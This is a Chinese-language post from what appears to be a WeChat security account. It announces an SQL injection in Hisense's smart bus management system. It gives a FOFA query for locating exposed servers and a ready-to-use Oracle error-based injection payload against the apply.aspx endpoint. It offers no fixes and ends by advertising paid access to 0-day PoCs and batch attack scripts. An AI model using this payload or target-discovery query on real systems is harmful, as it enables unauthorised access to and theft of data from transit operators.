#  漏洞推送|某信公交apply存在SQL注入漏洞   
小白菜安全  小白菜安全   2024-11-29 12:07  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞描述  
  
  
海信智能公交企业管理系统是一款基于大数据和人工智能技术构建的综合管理系统，旨在全面提升公交企业的安全保障能力、运营生产效率、企业管理水平、决策分析能力和乘客出行体验。该系统apply存在SQL注入漏洞，攻击者通过该漏洞获取敏感信息。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
资产信息  
  
  
fofa:"HisModules/ErpAdmin/RoleMng/Js/selectDefaultRole.js" || body="var _FactoryData"  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia23JoRNqsvBpg9aVia2zNgn1dvwJ1qEIztanND1n0zSaiajY5iacobW0EdrycQNDSzT2KiaT1HWEx7ZUw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
漏洞复现  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia23JoRNqsvBpg9aVia2zNgn1poAkDXL47kvRRRoQzB4aiaz7oxZAG0gbMcCIPdzCI7ZRtwbF73UiagPw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgxnz3h9W4zxUezdEZiaBGSsPMwDcYyJiaq6oqiaXuW8wdaNQoNDpczOZtg/640?wx_fmt=gif&from=appmsg "")  
  
POC  
  
```
/YZSoft/Forms/XForm/OA/apply.aspx?tid=1&did=-1%27%20AND%208081=(SELECT%20UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(107)||CHR(120)||CHR(113)||(SELECT%20(CASE%20WHEN%20(8081=8081)%20THEN%201%20ELSE%200%20END)%20FROM%20DUAL)||CHR(113)||CHR(98)||CHR(98)||CHR(113)||CHR(113)||CHR(62)))%20FROM%20DUAL)--%20OQnn
```  
  
---------------------------------------------------  
  
更多漏洞poc（0day漏洞）、安全工具、批量脚本加入内部圈子获取，目前只要49，无理由3天退款，加入圈子请扫描下方二维码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wz7rEzD4jThibDB3puG8zRTD9fLx4Ndhglm3VOUhNiczqNuriccyD38ibQw/640?wx_fmt=jpeg "")  
  
  
  
  
漏洞文库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wh2bIueGiaicJL46kobAMKQCktI8HFTcVM9JpwNibdMKD9ZND0ebC0rwnw/640?wx_fmt=png&from=appmsg "")  
  
  
工具收集：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3w26uxWScqm4lh60gQawZjffnNamZQR8BylhRBdjtf15dWgFsHMwrsFQ/640?wx_fmt=png&from=appmsg "")  
  
  
脚本文库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2ibXzzibVk15gaIwPj3Libib3wsdaXl2dhDDAJN3ZDl5fYWnGIckTK1vgLVHq2SHDDicic8OkMmMJ1fluw/640?wx_fmt=png&from=appmsg "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgOaSVwdVAPT7DWSKK7pjSWGdbQKWEM0yTB3JSqNxLUnEBesOW8eG40w/640?wx_fmt=png&from=appmsg "")  
  
免责声明  
  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/NhLcT1kxlia37svYWabvYzmhrJWdLfIHgAth2WTu4kyEzL1Dia7AXUWcP7tsbHDtpaH1cls1lJTPVNE6XTwLYvJg/640?wx_fmt=gif&from=appmsg "")  
  
  
  
